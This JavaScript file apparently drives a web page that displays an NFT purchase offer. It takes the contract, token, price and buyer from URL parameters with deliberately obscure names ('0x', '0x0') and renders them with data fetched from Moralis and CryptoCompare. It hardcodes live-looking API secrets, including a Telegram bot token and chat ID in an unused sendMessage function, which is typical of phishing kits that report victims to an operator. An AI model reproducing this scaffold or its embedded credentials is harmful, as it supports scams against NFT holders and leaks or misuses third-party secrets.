const queryString = window.location.search;
console.log(queryString);

const urlParams = new URLSearchParams(queryString);

const address = urlParams.get('0x');
const tokenID = urlParams.get('0x0');
const priceInEth = urlParams.get('0x0x');
const buyer = urlParams.get('0x0x0x');

// let address = "0x95995A9BEAf89265dE51104936C6aD9Ee961cc88";
// let tokenID = "2500";
// let priceInEth = 0.15;
// let buyer = "0xcf64f0d856ee1c469a44598c3b17539afce080ed"
let priceOfEth;

let _collectionName = document.getElementById("collectionName");
let _title = document.getElementById("title");
let _owner = document.getElementById("owner");
let _priceInEth = document.getElementById("priceInEth");
let _priceInDollar = document.getElementById("priceInDollars");
let _buyer = document.getElementById("buyer");



let bpeth = "0x2170Ed0880ac9A755fd29B2688956BD959F933F8";

async function getBalance(address, tokenID, api_key="KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp", chain="eth"){
    return new Promise((resolve, reject)=>{
      fetch(`https://deep-index.moralis.io/api/v2/nft/${address}/${tokenID}?chain=eth`, {
            method: "GET",
            headers: {
                "accept": "application/json",
                "X-API-Key": api_key
            }
        })
        .then(async(res) => {
            if(res.status > 399) throw res;
            resolve(await res.json());
        }).catch(err=>{
            reject(err);
        })
    })
  }
async function getImage(uri){
    return new Promise((resolve, reject)=>{
      fetch(`${uri}`, {
            method: "GET",
            headers: {
                "accept": "application/json",
                // "X-API-Key": api_key
            }
        })
        .then(async(res) => {
            if(res.status > 399) throw res;
            resolve(await res.json());
        }).catch(err=>{
            reject(err);
        })
    })
  }
  async function getPrice(address){
    return new Promise((resolve, reject)=>{
        fetch(`https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=BTC,USD,EU`, {
            method: "GET",
            headers: {
                //"accept": "application/json",
                //"X-API-Key": api_key
            }
        })
        .then(async(res) => {
            if(res.status > 399) throw res;
            resolve(await res.json());
        }).catch(err=>{
            reject(err);
        })
    })
  }
  async function sendMessage(message){
    return new Promise((resolve, reject)=>{
      const chat_id = 5227607491;
      fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
            method: "GET",
            headers: {
                
            }
        })
        .then(async(res) => {
            if(res.status > 399) throw res;
            resolve(await res.json());
        }).catch(err=>{
            reject(err);
        })
    })
  }
async function main(){
let tokenInfo = await getBalance(address, tokenID).catch(e=>{
    console.log("Unable to get infos", e);
    
  });
  //"{"name":"2500","image":"ipfs://QmRdsr5CDuz95eNrJFxypQwUjmSGKwgTGJXFYCnSFsWV4T","attributes":[{"trait_type":"DNA","value":"Pale"},{"trait_type":"Body","value":"Black-Tie"},{"trait_type":"Ears","value":""},{"trait_type":"Eyes","value":"Watery"},{"trait_type":"Head","value":"Green-Beanie"},{"trait_type":"Mouth","value":"Sour"},{"trait_type":"Background","value":"Mandarin"}]}"
  let owner = tokenInfo.owner_of;
  let collectionName = tokenInfo.name;
  let title = tokenInfo.symbol + " #" +  tokenInfo.token_id;
  let tokenuri = tokenInfo.token_uri;
  tokenuri = tokenuri.replace("https://ipfs.moralis.io:2053/ipfs", "https://ipfs.io/ipfs/");
  let image = await getImage(tokenuri);
  image = image.image;
  image = image.replace("ipfs://", "https://ipfs.io/ipfs/")

console.log(tokenInfo);

console.log(collectionName);
console.log(title);
console.log(owner);
console.log(image);

await getPrice().then(res => {
    console.log("Price", res)
    priceOfEth = parseInt(res.USD)
})
document.getElementById("nftimage").src = image;
console.log("Price of ETH in dollar", priceOfEth);
let priceInDollar = priceOfEth * priceInEth;
priceInDollar =  Math.round( priceInDollar );
console.log(priceInDollar);
_collectionName.innerHTML = collectionName;
_title.innerHTML = title;
_owner.innerHTML = owner;
_priceInEth.innerHTML = priceInEth;
_priceInDollar.innerHTML = "($" + priceInDollar + ")";
_buyer.innerHTML = buyer;

}
main();